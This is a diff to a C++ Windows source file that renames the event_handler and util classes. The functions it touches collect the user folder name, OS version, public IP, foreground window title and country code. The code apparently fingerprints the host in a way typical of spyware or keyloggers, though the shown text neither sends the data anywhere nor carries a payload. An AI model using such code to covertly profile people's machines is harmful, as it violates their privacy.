@@ -5,13 +5,13 @@
 #include "event_handler.h"
 
 
-void event_handler::GetComputerName(wchar_t *buf) {
+void EventHandler::GetComputerName(wchar_t *buf) {
     try {
         wchar_t folder[MAX_PATH];
         GetEnvironmentVariableW(L"UserProfile", folder, MAX_PATH);
 
         wchar_t test[MAX_PATH];
-        util::Trim(folder, 9, test);
+        Util::Trim(folder, 9, test);
 
         wcscpy(buf, test);
     } catch (int ex) {
@@ -21,7 +21,7 @@ void event_handler::GetComputerName(wchar_t *buf) {
 }
 
 
-void event_handler::GetOsVersion(wchar_t *buf) {
+void EventHandler::GetOsVersion(wchar_t *buf) {
     try {
         typedef NTSTATUS(WINAPI *LPFN_RTLGETVER)(LPOSVERSIONINFOEXW);
         LPFN_RTLGETVER fnRtlGetVer;
@@ -60,7 +60,7 @@ void event_handler::GetOsVersion(wchar_t *buf) {
     }
 }
 
-void event_handler::GetIp(wchar_t *buf_) {
+void EventHandler::GetIp(wchar_t *buf_) {
     try {
         HINTERNET net = InternetOpen("IP retriever",
                                      INTERNET_OPEN_TYPE_PRECONFIG,
@@ -94,7 +94,7 @@ void event_handler::GetIp(wchar_t *buf_) {
     }
 }
 
-void event_handler::GetActiveWindow(wchar_t *buf) {
+void EventHandler::GetActiveWindow(wchar_t *buf) {
     try {
         HWND foreground = GetForegroundWindow();
         if (foreground) {
@@ -112,7 +112,7 @@ void event_handler::GetActiveWindow(wchar_t *buf) {
     }
 }
 
-void event_handler::GetGeoId(wchar_t *buf) {
+void EventHandler::GetGeoId(wchar_t *buf) {
     try {
         GEOID my_geo = GetUserGeoID(GEOCLASS_NATION);
         int buffer_size = GetGeoInfoW(my_geo, GEO_ISO2, NULL, 0, 0);
